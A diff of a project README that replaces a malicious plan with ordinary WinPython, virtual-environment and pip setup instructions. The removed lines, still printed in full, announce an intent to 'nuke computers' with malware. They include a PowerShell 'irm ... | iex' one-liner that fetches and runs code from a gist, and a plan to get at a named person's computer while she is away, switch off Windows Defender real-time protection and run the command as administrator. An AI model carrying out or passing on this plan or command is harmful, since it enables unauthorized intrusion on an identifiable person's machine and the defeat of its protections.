@@ -1,18 +1,47 @@
-im making malware and going to be nuking computers with it :))).
+## Setup Instructions
 
-steps to run this whole system:
+1. **Download WinPython**
+   Get the latest release from:
+   [https://sourceforge.net/projects/winpython/files/latest/download](https://sourceforge.net/projects/winpython/files/latest/download)
 
-1. plug the usb with the payload installed on the computer.:
+2. **Extract WinPython**
+   Unpack it directly into this project’s root directory.
 
-2. run the DOUBLE_CLICK_ME.bat file inside of the root of the usb. 
+3. **Open the WinPython Command Prompt**
+   Launch `WinPython Command Prompt.exe` from the WinPython folder.
 
+4. **Navigate to the project root**
 
+   ```bash
+   cd <path-to-project-root>
+   ```
 
+5. **Create a virtual environment**
 
+   ```bash
+   python -m venv venv
+   ```
 
-irm https://gist.githubusercontent.com/xurst/495240cfb21eb3e9ad83f4c239258f90/raw/gistfile1.txt | iex
+6. **Activate the virtual environment**
 
-plan:
+   ```bash
+   .\venv\Scripts\activate
+   ```
 
-1. get access to ms omalley computer (in lunch room when shes gone for around 30 sec to 1 minute)
-2. open virus and threat protection settings, under virus and threat protection settings click manage settings, then disable real time protection. then run the command above in an ADMIN POWERSHELL WINDOW
+7. **Install the required packages**
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+8. **Navigate to the source directory**
+
+   ```bash
+   cd src
+   ```
+
+9. **Run the application**
+
+   ```bash
+   python main.py
+   ```
